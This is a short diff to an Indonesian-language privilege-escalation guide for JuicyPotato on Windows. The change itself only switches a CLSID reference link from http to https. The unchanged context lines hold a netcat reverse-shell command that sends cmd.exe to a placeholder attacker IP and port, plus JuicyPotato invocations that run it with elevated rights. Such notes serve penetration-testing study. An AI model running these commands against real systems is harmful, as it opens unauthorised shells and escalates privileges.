@@ -50,7 +50,7 @@ PS > echo "c:\users\public\nc.exe -e cmd.exe <ip-attacker> <port>" > rev.bat
 ```powershell
 PS > .\JuicyPotato.exe -t * -p C:\Users\Public\rev.bat -l 9003
 ```
-6. Kalau CLSID bermasalah, coba cari [CLSID lain](http://ohpe.it/juicy-potato/CLSID/).
+6. Kalau CLSID bermasalah, coba cari [CLSID lain](https://ohpe.it/juicy-potato/CLSID/).
 ```powershell
 PS > .\JuicyPotato.exe -t * -p C:\Users\Public\rev.bat -l 9003 -c {CLSID}
 ```
